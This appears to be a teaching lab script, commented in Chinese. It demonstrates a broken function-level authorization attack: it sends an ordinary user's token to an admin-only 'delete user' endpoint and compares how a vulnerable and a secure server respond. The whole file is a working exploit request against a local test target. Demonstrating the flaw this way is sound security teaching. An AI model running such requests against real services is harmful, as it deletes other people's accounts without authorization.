"""BFLA 攻擊腳本:以一般使用者身分,呼叫管理員專屬的「刪除使用者」端點。

同一支腳本打 vulnerable 與 secure 兩版,靠回應差異證明漏洞是否成立:
- vulnerable:只認證不看角色 → 一般使用者成功刪掉別人帳號 → 功能層級授權失效。
- secure:預設拒絕 + 角色檢查 → 一般使用者被 403 擋下。
"""

import requests

ATTACKER_TOKEN = "user-token"  # 一般使用者(非管理員)的合法令牌
VICTIM_ID = 2                  # 要刪掉的受害者帳號
REQUEST_TIMEOUT_SECONDS = 5


def run_bfla_attack(base_url):
    """回傳 (是否越權成功, 說明字串)。是否越權成功=True 代表漏洞成立。"""
    headers = {"Authorization": f"Bearer {ATTACKER_TOKEN}"}
    resp = requests.delete(
        f"{base_url}/api/admin/users/{VICTIM_ID}",
        headers=headers,
        timeout=REQUEST_TIMEOUT_SECONDS,
    )
    if resp.status_code == 200:
        return True, f"越權成功!一般使用者呼叫管理端點刪掉了帳號({resp.json().get('message')})"
    if resp.status_code == 403:
        return False, "被 403 擋下,功能層級授權檢查生效(非管理員不得刪帳號)"
    return False, f"未越權(status={resp.status_code})"


if __name__ == "__main__":
    import sys

    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:5051"
    escalated, message = run_bfla_attack(target)
    print(("[漏洞成立] " if escalated else "[已防禦] ") + message)
